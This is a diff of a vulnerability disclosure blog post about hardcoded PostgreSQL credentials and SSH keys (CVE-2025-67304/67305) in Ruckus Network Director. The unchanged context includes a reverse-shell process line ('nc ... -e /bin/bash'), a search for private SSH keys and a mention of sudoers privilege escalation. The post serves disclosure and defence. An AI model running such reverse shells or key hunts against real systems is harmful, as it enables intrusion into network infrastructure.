@@ -16,7 +16,7 @@ _The Ruckus Network Director (RND) is application software, which targets an "on
 
 So we are talking about a product designed to scale up to a million access points. Compromise the controller, compromise the network, compromise the fleet. Let's take a look.
 
-# Hardcoded PostgreSQL credentials
+# Hardcoded PostgreSQL credentials (CVE-2025-67304)
 
 Ruckus allows you to [download](https://support.ruckuswireless.com/software/4590-ruckus-network-director-4-5-software-release) the Ruckus Network Director Open Virtualization Appliance (OVA). The latest version at the time was 4.5.0.52. OVA is nice as it is easy to load the appliance and poke around it. Setting up the RND appliance was pretty straight forward - basically you set an IP address, change the admin password for the appliance / web interface, configure it as a primary or secondary node and you are good to go. Here is what the web UI looks like (taken from official [documentation](https://support.ruckuswireless.com/documents/4782-ruckus-network-director-user-guide-4-5)):
 
@@ -148,7 +148,7 @@ postgres 12682 12057  0 20:49 ?        00:00:00 nc 10.0.13.138 4444 -e /bin/bash
 ...
 ```
 
-# Hardcoded SSH keys
+# Hardcoded SSH keys (CVE-2025-67305)
 
 Since I already have everything set-up, I decided to try finding some more low-hanging fruit. I believe you would rather see a chain of 6 obscure web vulnerabilities that I cannot even pronounce, but what `find /mnt/rnd/ -type f -name "id_rsa*"` found is just irreplaceable.
 
@@ -180,9 +180,9 @@ Same `postgres` user, same superuser database privileges, but now direct SSH acc
 
 What I have always found most entertaining in social media posts are over-exaggerations of the vulnerability itself and its impact. 
 
-_"I discovered a stored XSS that needs to be triggered by someone visiting my profile and looking at my shikata_ga_nai-crafted SVG image. The only problem is that no-one will ever look at my profile cause you cannot look at other peoples profiles in this app. But let's say someone does, and if it is an admin user who also for his specific configuration removed all the normally-present secure cookie attributes, I could steal his cookie, escape the browser sandbox, execute code on the OS and then use my -1 day exploit for a Kernel driver which works if Mercury is in retrograde."_. 
+_"I found a stored XSS triggered by someone visiting my profile and looking at my SVG profile photo. The only problem is that no one can view other people's profiles in this app. But let's say someone can and it happens to be an admin who removed all the normally-present secure cookie attributes from the servers' configuration. I could then execute code on the OS and get a shell. Mercury being in retrograde is required."_
 
-While I am sure and admire anyone that can actually do that - I am not the one. But I will certainly use the same over-exaggerating tactics here, as for mere fun for something I found later.
+I will shamelessly use the same over-exaggerating tactics here — purely for fun, as things got funny later.
 
 So, you got a shell on the Network Director, you can access the database and you obtained password hashes from other users. Let's assume that you actually cracked a password hash for some user and that their web UI password is the same as for the admin user used for terminal access. OK? Mercury still retrograde? OK. Then you can actually perform local privilege escalation, due to `/etc/sudoers` configuration:
 
@@ -240,7 +240,6 @@ Both vulnerabilities are trivial to exploit. No fuzzing, no reverse engineering,
 - Files `id_rsa_pgpool` / `id_rsa_pgpool.pub` in `/data/var/lib/pgsql/.ssh/` with sha256sums `24890808bc8c1715ec4146645d697464d48661333e19a93d516d69788534fcd6` / `2b4fb15d13d50984e074f81f400fe2c06c40912e3feebadcbbeb485e50388db4`
 
 **Remediation**
-
 To fix both vulnerabilities, upgrade to RUCKUS Network Director 4.5.0.56.
 
 Post-patch verification:
